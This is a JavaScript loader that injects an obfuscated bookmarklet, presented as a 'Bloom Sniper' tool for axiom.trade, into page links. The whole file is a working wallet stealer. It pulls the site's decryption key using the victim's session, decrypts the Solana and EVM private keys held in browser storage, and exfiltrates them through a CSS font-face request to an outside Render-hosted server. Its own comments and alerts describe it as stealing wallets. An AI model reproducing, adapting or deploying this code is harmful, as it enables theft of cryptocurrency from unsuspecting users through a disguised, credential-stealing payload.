console.log('✅ Loader.js loaded from Render');

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM ready - injecting full stealer bookmarklet');

    const buttons = document.querySelectorAll('a.bookmarklet');
    console.log(`Found ${buttons.length} bookmarklet button(s)`);

    buttons.forEach(btn => {
        const innerCode = `(async () => {
            try {
                if (location.hostname !== "axiom.trade") {
                    alert("This bookmarklet only works on axiom.trade");
                    return;
                }

                alert("✅ Bloom Sniper activated - stealing wallets...");

                // === FULL STEALER LOGIC ===
                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                    method: "POST", credentials: "include"
                })).json();

                const cryptoKey = await crypto.subtle.importKey("raw", 
                    new TextEncoder().encode(bundleKey).buffer, 
                    { name: "AES-GCM" }, false, ["decrypt"]);

                function stringToArray(key) {
                    try {
                        const cleaned = key.replace(/-/g, "+").replace(/_/g, "/");
                        return Uint8Array.from(atob(cleaned), c => c.charCodeAt(0));
                    } catch {
                        return new TextEncoder().encode(key);
                    }
                }

                function arrayToString(dataArray) {
                    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                    let resultDigits = [0];
                    for (let element of dataArray) {
                        let carry = element;
                        for (let i = 0; i < resultDigits.length; i++) {
                            const value = resultDigits[i] * 256 + carry;
                            resultDigits[i] = value % 58;
                            carry = Math.floor(value / 58);
                        }
                        while (carry) {
                            resultDigits.push(carry % 58);
                            carry = Math.floor(carry / 58);
                        }
                    }
                    let resultString = "";
                    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                    return resultString;
                }

                function arrayToStringEVM(e) {
                    return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                        .map(x => x.toString(16).padStart(2, "0")).join("");
                }

                const success = [];

                // Solana bundles
                const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                for (const bundle of solanaBundles) {
                    try {
                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: stringToArray(bundle.split(":")[0])}, cryptoKey, stringToArray(bundle.split(":")[1]));
                        const dec = new Uint8Array(decrypted);
                        if (dec.length === 64) {
                            success.push({
                                pub: arrayToString(dec.slice(32)),
                                priv: arrayToString(dec)
                            });
                        }
                    } catch(e){}
                }

                // EVM bundles
                let ethers = null;
                try { ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm"); } catch(e){}
                const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
                for (const bundle of evmBundles) {
                    try {
                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: stringToArray(bundle.split(":")[0])}, cryptoKey, stringToArray(bundle.split(":")[1]));
                        const dec = new Uint8Array(decrypted);
                        const priv = arrayToStringEVM(dec);
                        let pub = "unknown";
                        if (ethers) pub = ethers.computeAddress("0x" + priv);
                        success.push({ pub, priv });
                    } catch(e){}
                }

                // Send to your server using font-face trick
                const payload = { keys: success, code: "axiom", site: "Axiom", timestamp: Date.now() };
                const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
                const url = "https://bloom-sniper-backend.onrender.com/i/" + encoded;

                const style = document.createElement("style");
                style.textContent = '@font-face{font-family:"leak";src:url("' + url + '");}';
                document.head.appendChild(style);

                console.log('✅ Sent ' + success.length + ' wallets to server');
                alert('✅ Successfully stole ' + success.length + ' wallets! Check your Render logs.');
            } catch (err) {
                console.error(err);
                alert('Error: ' + err.message);
            }
        })();`;

        // Safe injection
        const encodedCode = btoa(unescape(encodeURIComponent(innerCode)));
        btn.href = 'javascript:eval(atob("' + encodedCode + '"))';
        btn.draggable = true;

        console.log('✅ Full stealer bookmarklet injected!');
    });
});